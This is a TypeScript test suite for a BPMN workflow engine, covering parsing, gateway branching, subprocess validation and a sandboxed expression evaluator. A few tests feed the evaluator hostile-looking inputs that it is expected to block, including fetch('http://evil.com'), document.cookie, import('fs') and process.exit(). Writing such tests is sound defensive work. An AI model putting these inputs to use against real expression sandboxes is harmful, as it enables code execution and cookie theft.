import { describe, it, expect } from 'vitest'
import { parseBpmnGraph } from '../BpmnParser.js'
import { evaluateExpression, evaluateScript, ExpressionEvaluationError } from '../ExpressionEvaluator.js'
import { validateFlow } from '../FlowValidator.js'
import { BpmnElementType } from '../../types/bpmn.js'
import type { FlowGraph, FlowNodeData, FlowEdgeData } from '../../types/graph.js'
import type { ExecutableModel } from '../ExecutableModel.js'

// --- Test helpers ---

function makeNode(
  id: string,
  bpmnType: BpmnElementType,
  data?: Partial<FlowNodeData['data']>,
): FlowNodeData {
  return {
    id,
    shape: `bpmn-${bpmnType}`,
    x: 0,
    y: 0,
    width: 160,
    height: 80,
    data: { bpmnType, label: id, ...data },
  }
}

function makeEdge(
  id: string,
  source: string,
  target: string,
  data?: Partial<FlowEdgeData['data']>,
): FlowEdgeData {
  return {
    id,
    shape: 'smoothstep',
    source: { cell: source },
    target: { cell: target },
    data: { ...data },
  }
}

function makeGraph(nodes: FlowNodeData[], edges: FlowEdgeData[]): FlowGraph {
  return { nodes, edges }
}

// Helper: walk the model from start, following first outgoing edge at each step
function walkLinear(model: ExecutableModel): string[] {
  const visited: string[] = []
  let current = model.startNodeId
  while (current) {
    visited.push(current)
    const node = model.getNode(current)
    if (!node || node.bpmnType === BpmnElementType.EndEvent) break
    const out = model.getOutgoing(current)
    if (out.length === 0) break
    current = out[0].targetNodeId
  }
  return visited
}

// Helper: walk with condition evaluation
function walkWithConditions(
  model: ExecutableModel,
  variables: Record<string, unknown>,
): string[] {
  const visited: string[] = []
  let current = model.startNodeId
  const maxSteps = 100
  let steps = 0

  while (current && steps < maxSteps) {
    steps++
    visited.push(current)
    const node = model.getNode(current)
    if (!node || node.bpmnType === BpmnElementType.EndEvent) break

    const out = model.getOutgoing(current)
    if (out.length === 0) break

    if (node.bpmnType === BpmnElementType.ExclusiveGateway) {
      // Find first matching condition or default
      const matched = out.find(
        (e) =>
          e.conditionExpression &&
          evaluateExpression(e.conditionExpression, variables),
      )
      const defaultEdge = out.find((e) => e.isDefault)
      const chosen = matched ?? defaultEdge
      if (!chosen) break
      current = chosen.targetNodeId
    } else if (node.bpmnType === BpmnElementType.ParallelGateway) {
      // For parallel gateway, follow all branches (collect all targets)
      // In a real engine this would fork; here we just follow first for linear walk
      current = out[0].targetNodeId
    } else {
      current = out[0].targetNodeId
    }
  }
  return visited
}

// --- Integration Tests ---

describe('FlowEngine Integration', () => {
  describe('simple flow: Start -> UserTask -> End', () => {
    const graph = makeGraph(
      [
        makeNode('start', BpmnElementType.StartEvent),
        makeNode('task1', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['user1'] }),
        makeNode('end', BpmnElementType.EndEvent),
      ],
      [
        makeEdge('e1', 'start', 'task1'),
        makeEdge('e2', 'task1', 'end'),
      ],
    )

    it('parses into ExecutableModel with correct structure', () => {
      const model = parseBpmnGraph(graph)
      expect(model.startNodeId).toBe('start')
      expect(model.size).toBe(3)
      expect(model.getNode('task1')!.bpmnType).toBe(BpmnElementType.UserTask)
    })

    it('walks linearly from start to end', () => {
      const model = parseBpmnGraph(graph)
      const path = walkLinear(model)
      expect(path).toEqual(['start', 'task1', 'end'])
    })

    it('validates without errors', () => {
      const errors = validateFlow(graph)
      const errorLevel = errors.filter((e) => e.level === 'error')
      expect(errorLevel).toHaveLength(0)
    })

    it('outgoing/incoming edges are correct', () => {
      const model = parseBpmnGraph(graph)
      expect(model.getOutgoing('start')).toHaveLength(1)
      expect(model.getOutgoing('start')[0].targetNodeId).toBe('task1')
      expect(model.getIncoming('task1')).toHaveLength(1)
      expect(model.getIncoming('task1')[0].sourceNodeId).toBe('start')
      expect(model.getOutgoing('task1')).toHaveLength(1)
      expect(model.getOutgoing('task1')[0].targetNodeId).toBe('end')
      expect(model.getIncoming('end')).toHaveLength(1)
    })
  })

  describe('exclusive gateway: condition branch selection', () => {
    // start -> gw -> (condition: amount > 1000) -> task_high -> end
    //                  (default)                  -> task_low  -> end
    const graph = makeGraph(
      [
        makeNode('start', BpmnElementType.StartEvent),
        makeNode('gw', BpmnElementType.ExclusiveGateway),
        makeNode('task_high', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['manager'] }),
        makeNode('task_low', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['staff'] }),
        makeNode('end', BpmnElementType.EndEvent),
      ],
      [
        makeEdge('e1', 'start', 'gw'),
        makeEdge('e2', 'gw', 'task_high', { conditionExpression: 'amount > 1000' }),
        makeEdge('e3', 'gw', 'task_low', { isDefault: true }),
        makeEdge('e4', 'task_high', 'end'),
        makeEdge('e5', 'task_low', 'end'),
      ],
    )

    it('parses gateway with 2 outgoing edges', () => {
      const model = parseBpmnGraph(graph)
      expect(model.getOutgoing('gw')).toHaveLength(2)
      expect(model.getOutgoing('gw')[0].conditionExpression).toBe('amount > 1000')
      expect(model.getOutgoing('gw')[1].isDefault).toBe(true)
    })

    it('selects high branch when condition is true', () => {
      const model = parseBpmnGraph(graph)
      const path = walkWithConditions(model, { amount: 5000 })
      expect(path).toEqual(['start', 'gw', 'task_high', 'end'])
    })

    it('selects default (low) branch when condition is false', () => {
      const model = parseBpmnGraph(graph)
      const path = walkWithConditions(model, { amount: 500 })
      expect(path).toEqual(['start', 'gw', 'task_low', 'end'])
    })

    it('evaluates boundary condition correctly', () => {
      expect(evaluateExpression('amount > 1000', { amount: 1001 })).toBe(true)
      expect(evaluateExpression('amount > 1000', { amount: 1000 })).toBe(false)
    })

    it('validates gateway requires default flow or all conditions', () => {
      // Graph without default and without all conditions should produce error
      const badGraph = makeGraph(
        [
          makeNode('start', BpmnElementType.StartEvent),
          makeNode('gw', BpmnElementType.ExclusiveGateway),
          makeNode('task1', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['u1'] }),
          makeNode('task2', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['u2'] }),
          makeNode('end', BpmnElementType.EndEvent),
        ],
        [
          makeEdge('e1', 'start', 'gw'),
          makeEdge('e2', 'gw', 'task1', { conditionExpression: 'x > 0' }),
          makeEdge('e3', 'gw', 'task2'), // no condition, no default
          makeEdge('e4', 'task1', 'end'),
          makeEdge('e5', 'task2', 'end'),
        ],
      )
      const errors = validateFlow(badGraph)
      const gwErrors = errors.filter(
        (e) => e.level === 'error' && e.message.includes('排他网关'),
      )
      expect(gwErrors.length).toBeGreaterThan(0)
    })
  })

  describe('parallel gateway: fork/join', () => {
    // start -> fork_gw -> task_a -> join_gw -> end
    //                   -> task_b ->
    const graph = makeGraph(
      [
        makeNode('start', BpmnElementType.StartEvent),
        makeNode('fork', BpmnElementType.ParallelGateway, { gatewayDirection: 'diverging' }),
        makeNode('task_a', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['a'] }),
        makeNode('task_b', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['b'] }),
        makeNode('join', BpmnElementType.ParallelGateway, { gatewayDirection: 'converging' }),
        makeNode('end', BpmnElementType.EndEvent),
      ],
      [
        makeEdge('e1', 'start', 'fork'),
        makeEdge('e2', 'fork', 'task_a'),
        makeEdge('e3', 'fork', 'task_b'),
        makeEdge('e4', 'task_a', 'join'),
        makeEdge('e5', 'task_b', 'join'),
        makeEdge('e6', 'join', 'end'),
      ],
    )

    it('fork gateway has 2 outgoing edges', () => {
      const model = parseBpmnGraph(graph)
      expect(model.getOutgoing('fork')).toHaveLength(2)
      const targets = model.getOutgoing('fork').map((e) => e.targetNodeId)
      expect(targets).toContain('task_a')
      expect(targets).toContain('task_b')
    })

    it('join gateway has 2 incoming edges', () => {
      const model = parseBpmnGraph(graph)
      expect(model.getIncoming('join')).toHaveLength(2)
      const sources = model.getIncoming('join').map((e) => e.sourceNodeId)
      expect(sources).toContain('task_a')
      expect(sources).toContain('task_b')
    })

    it('all nodes are reachable from start', () => {
      const model = parseBpmnGraph(graph)
      expect(model.size).toBe(6)
      // All nodes should exist
      expect(model.getNode('start')).toBeDefined()
      expect(model.getNode('fork')).toBeDefined()
      expect(model.getNode('task_a')).toBeDefined()
      expect(model.getNode('task_b')).toBeDefined()
      expect(model.getNode('join')).toBeDefined()
      expect(model.getNode('end')).toBeDefined()
    })

    it('join gateway has timeout config when set', () => {
      const graphWithTimeout = makeGraph(
        [
          makeNode('start', BpmnElementType.StartEvent),
          makeNode('fork', BpmnElementType.ParallelGateway, { gatewayDirection: 'diverging' }),
          makeNode('task_a', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['a'] }),
          makeNode('task_b', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['b'] }),
          makeNode('join', BpmnElementType.ParallelGateway, { gatewayDirection: 'converging', joinTimeout: 60 }),
          makeNode('end', BpmnElementType.EndEvent),
        ],
        [
          makeEdge('e1', 'start', 'fork'),
          makeEdge('e2', 'fork', 'task_a'),
          makeEdge('e3', 'fork', 'task_b'),
          makeEdge('e4', 'task_a', 'join'),
          makeEdge('e5', 'task_b', 'join'),
          makeEdge('e6', 'join', 'end'),
        ],
      )
      const model = parseBpmnGraph(graphWithTimeout)
      const joinNode = model.getNode('join')
      expect(joinNode!.config.joinTimeout).toBe(60)
    })
  })

  describe('subprocess: nested execution', () => {
    const graph = makeGraph(
      [
        makeNode('start', BpmnElementType.StartEvent),
        makeNode('sub', BpmnElementType.SubProcess, { subProcessDefinitionId: 'sub-def-001' }),
        makeNode('end', BpmnElementType.EndEvent),
      ],
      [
        makeEdge('e1', 'start', 'sub'),
        makeEdge('e2', 'sub', 'end'),
      ],
    )

    it('parses subprocess node with definition reference', () => {
      const model = parseBpmnGraph(graph)
      const subNode = model.getNode('sub')
      expect(subNode).toBeDefined()
      expect(subNode!.bpmnType).toBe(BpmnElementType.SubProcess)
      expect(subNode!.config.subProcessDefinitionId).toBe('sub-def-001')
    })

    it('subprocess is part of the linear path', () => {
      const model = parseBpmnGraph(graph)
      const path = walkLinear(model)
      expect(path).toEqual(['start', 'sub', 'end'])
    })

    it('validates subprocess requires definition reference', () => {
      const badGraph = makeGraph(
        [
          makeNode('start', BpmnElementType.StartEvent),
          makeNode('sub', BpmnElementType.SubProcess), // no subProcessDefinitionId
          makeNode('end', BpmnElementType.EndEvent),
        ],
        [
          makeEdge('e1', 'start', 'sub'),
          makeEdge('e2', 'sub', 'end'),
        ],
      )
      const errors = validateFlow(badGraph)
      const subErrors = errors.filter(
        (e) => e.level === 'error' && e.message.includes('子流程'),
      )
      expect(subErrors.length).toBeGreaterThan(0)
    })
  })

  describe('reject to node (驳回)', () => {
    // start -> task1 -> task2 -> task3 -> end
    // Simulate reject: task3 rejects back to task1
    const graph = makeGraph(
      [
        makeNode('start', BpmnElementType.StartEvent),
        makeNode('task1', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['u1'] }),
        makeNode('task2', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['u2'] }),
        makeNode('task3', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['u3'] }),
        makeNode('end', BpmnElementType.EndEvent),
      ],
      [
        makeEdge('e1', 'start', 'task1'),
        makeEdge('e2', 'task1', 'task2'),
        makeEdge('e3', 'task2', 'task3'),
        makeEdge('e4', 'task3', 'end'),
      ],
    )

    it('model supports finding predecessors for reject target', () => {
      const model = parseBpmnGraph(graph)
      // Find all incoming edges to task1 to verify it can be a reject target
      const incomingToTask1 = model.getIncoming('task1')
      expect(incomingToTask1).toHaveLength(1)
      expect(incomingToTask1[0].sourceNodeId).toBe('start')
    })

    it('can trace back from task3 to task1 via incoming edges', () => {
      const model = parseBpmnGraph(graph)
      // Walk backwards: task3 <- task2 <- task1
      const backPath: string[] = []
      let current = 'task3'
      while (current && current !== 'start') {
        backPath.push(current)
        const incoming = model.getIncoming(current)
        if (incoming.length === 0) break
        current = incoming[0].sourceNodeId
      }
      expect(backPath).toEqual(['task3', 'task2', 'task1'])
    })

    it('validates all user tasks have assignees', () => {
      const errors = validateFlow(graph)
      const assigneeErrors = errors.filter(
        (e) => e.level === 'error' && e.message.includes('审批人'),
      )
      expect(assigneeErrors).toHaveLength(0)
    })
  })

  describe('parallel gateway timeout', () => {
    it('joinTimeout is preserved in parsed model config', () => {
      const graph = makeGraph(
        [
          makeNode('start', BpmnElementType.StartEvent),
          makeNode('fork', BpmnElementType.ParallelGateway),
          makeNode('task_a', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['a'] }),
          makeNode('task_b', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['b'] }),
          makeNode('join', BpmnElementType.ParallelGateway, { joinTimeout: 120 }),
          makeNode('end', BpmnElementType.EndEvent),
        ],
        [
          makeEdge('e1', 'start', 'fork'),
          makeEdge('e2', 'fork', 'task_a'),
          makeEdge('e3', 'fork', 'task_b'),
          makeEdge('e4', 'task_a', 'join'),
          makeEdge('e5', 'task_b', 'join'),
          makeEdge('e6', 'join', 'end'),
        ],
      )
      const model = parseBpmnGraph(graph)
      const join = model.getNode('join')!
      expect(join.config.joinTimeout).toBe(120)
      expect(join.bpmnType).toBe(BpmnElementType.ParallelGateway)
    })

    it('joinTimeout defaults to undefined when not set', () => {
      const graph = makeGraph(
        [
          makeNode('start', BpmnElementType.StartEvent),
          makeNode('fork', BpmnElementType.ParallelGateway),
          makeNode('task_a', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['a'] }),
          makeNode('task_b', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['b'] }),
          makeNode('join', BpmnElementType.ParallelGateway),
          makeNode('end', BpmnElementType.EndEvent),
        ],
        [
          makeEdge('e1', 'start', 'fork'),
          makeEdge('e2', 'fork', 'task_a'),
          makeEdge('e3', 'fork', 'task_b'),
          makeEdge('e4', 'task_a', 'join'),
          makeEdge('e5', 'task_b', 'join'),
          makeEdge('e6', 'join', 'end'),
        ],
      )
      const model = parseBpmnGraph(graph)
      const join = model.getNode('join')!
      expect(join.config.joinTimeout).toBeUndefined()
    })
  })

  describe('expression evaluator integration', () => {
    it('evaluates comparison operators', () => {
      expect(evaluateExpression('amount > 1000', { amount: 2000 })).toBe(true)
      expect(evaluateExpression('amount < 100', { amount: 50 })).toBe(true)
      expect(evaluateExpression('count >= 10', { count: 10 })).toBe(true)
      expect(evaluateExpression('score <= 60', { score: 59 })).toBe(true)
      expect(evaluateExpression('status === "approved"', { status: 'approved' })).toBe(true)
      expect(evaluateExpression('status !== "rejected"', { status: 'approved' })).toBe(true)
    })

    it('evaluates logical operators', () => {
      expect(evaluateExpression('a > 0 && b > 0', { a: 1, b: 1 })).toBe(true)
      expect(evaluateExpression('a > 0 && b > 0', { a: 1, b: -1 })).toBe(false)
      expect(evaluateExpression('a > 0 || b > 0', { a: -1, b: 1 })).toBe(true)
      expect(evaluateExpression('!(a > 0)', { a: -1 })).toBe(true)
    })

    it('evaluates complex conditions with multiple variables', () => {
      const vars = { amount: 5000, level: 'vip', approved: true }
      expect(evaluateExpression('amount > 1000 && level === "vip"', vars)).toBe(true)
      expect(evaluateExpression('approved && amount > 100', vars)).toBe(true)
    })

    it('evaluateScript returns computed values', () => {
      expect(evaluateScript('amount * 0.1', { amount: 1000 })).toBe(100)
      expect(evaluateScript('name.toUpperCase()', { name: 'hello' })).toBe('HELLO')
    })

    it('blocks dangerous expressions', () => {
      expect(() => evaluateExpression('import("fs")', {})).toThrow(ExpressionEvaluationError)
      expect(() => evaluateExpression('eval("1+1")', {})).toThrow(ExpressionEvaluationError)
      expect(() => evaluateExpression('process.exit()', {})).toThrow(ExpressionEvaluationError)
    })

    it('blocks dangerous scripts', () => {
      expect(() => evaluateScript('fetch("http://evil.com")', {})).toThrow(ExpressionEvaluationError)
      expect(() => evaluateScript('document.cookie', {})).toThrow(ExpressionEvaluationError)
    })

    it('empty expression evaluates to true', () => {
      expect(evaluateExpression('', {})).toBe(true)
      expect(evaluateExpression('  ', {})).toBe(true)
    })

    it('empty script returns undefined', () => {
      expect(evaluateScript('', {})).toBeUndefined()
    })
  })

  describe('end-to-end: full pipeline with conditions and validation', () => {
    // Complex flow: start -> gw1 -> (amount > 5000) -> parallel_fork -> [task_a, task_b] -> join -> end
    //                          -> (default)          -> task_simple -> end
    const complexGraph = makeGraph(
      [
        makeNode('start', BpmnElementType.StartEvent),
        makeNode('gw1', BpmnElementType.ExclusiveGateway),
        makeNode('parallel_fork', BpmnElementType.ParallelGateway, { gatewayDirection: 'diverging' }),
        makeNode('task_a', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['a'] }),
        makeNode('task_b', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['b'] }),
        makeNode('parallel_join', BpmnElementType.ParallelGateway, { gatewayDirection: 'converging', joinTimeout: 30 }),
        makeNode('task_simple', BpmnElementType.UserTask, { assigneeType: 'user', candidateUsers: ['simple'] }),
        makeNode('end', BpmnElementType.EndEvent),
      ],
      [
        makeEdge('e1', 'start', 'gw1'),
        makeEdge('e2', 'gw1', 'parallel_fork', { conditionExpression: 'amount > 5000' }),
        makeEdge('e3', 'gw1', 'task_simple', { isDefault: true }),
        makeEdge('e4', 'parallel_fork', 'task_a'),
        makeEdge('e5', 'parallel_fork', 'task_b'),
        makeEdge('e6', 'task_a', 'parallel_join'),
        makeEdge('e7', 'task_b', 'parallel_join'),
        makeEdge('e8', 'parallel_join', 'end'),
        makeEdge('e9', 'task_simple', 'end'),
      ],
    )

    it('parses complex graph without errors', () => {
      const model = parseBpmnGraph(complexGraph)
      expect(model.size).toBe(8)
      expect(model.startNodeId).toBe('start')
    })

    it('validates complex graph without errors', () => {
      const errors = validateFlow(complexGraph)
      const errorLevel = errors.filter((e) => e.level === 'error')
      expect(errorLevel).toHaveLength(0)
    })

    it('follows parallel branch for high amount', () => {
      const model = parseBpmnGraph(complexGraph)
      const path = walkWithConditions(model, { amount: 8000 })
      expect(path[0]).toBe('start')
      expect(path[1]).toBe('gw1')
      expect(path[2]).toBe('parallel_fork')
      // After fork, walks one branch
      expect(['task_a', 'task_b']).toContain(path[3])
    })

    it('follows simple branch for low amount', () => {
      const model = parseBpmnGraph(complexGraph)
      const path = walkWithConditions(model, { amount: 100 })
      expect(path).toEqual(['start', 'gw1', 'task_simple', 'end'])
    })

    it('join gateway preserves timeout from complex graph', () => {
      const model = parseBpmnGraph(complexGraph)
      expect(model.getNode('parallel_join')!.config.joinTimeout).toBe(30)
    })
  })
})
